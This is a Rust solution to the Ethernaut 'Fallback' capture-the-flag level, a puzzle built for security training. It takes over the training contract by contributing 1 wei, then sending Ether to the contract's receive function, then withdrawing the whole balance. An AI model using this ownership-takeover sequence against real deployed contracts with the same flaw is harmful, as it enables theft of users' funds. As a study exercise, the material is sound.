//! Ethernaut 01 — Fallback.
//!
//! Goal: Take ownership of `Fallback`, an Ether contribution contract, and
//! reduce its Ether balance to zero.
//!
//! Source: [Fallback.sol][source]. [Rust harness][harness].
//! Test: `cargo test -p attack fallback -- --nocapture`
//!
//! [source]:
//! ../../../../lib/ethernaut/contracts/src/levels/Fallback.sol
//! [harness]: ctf::ethereum::ethernaut::lvl01_fallback

use alloy::primitives::U256;
use async_trait::async_trait;
use ctf::Actor;
use ctf::ethereum::ethernaut::lvl01_fallback::*;

pub struct Exploit;

#[async_trait]
impl ctf::Exploit for Exploit {
    type Target = Target;

    async fn attack(
        self,
        target: &Target,
        offender: &Actor,
    ) -> eyre::Result<()> {
        let contract =
            Fallback::new(target.address, offender.provider().clone());

        println!("Calling contribute()...");
        contract
            .contribute()
            .value(U256::from(1))
            .from(offender.address())
            .send()
            .await?
            .watch()
            .await?;

        println!("Calling receive()...");
        offender.transfer(target.address, U256::from(1)).await?;

        println!("Calling withdraw()...");
        contract
            .withdraw()
            .from(offender.address())
            .send()
            .await?
            .watch()
            .await?;

        Ok(())
    }
}
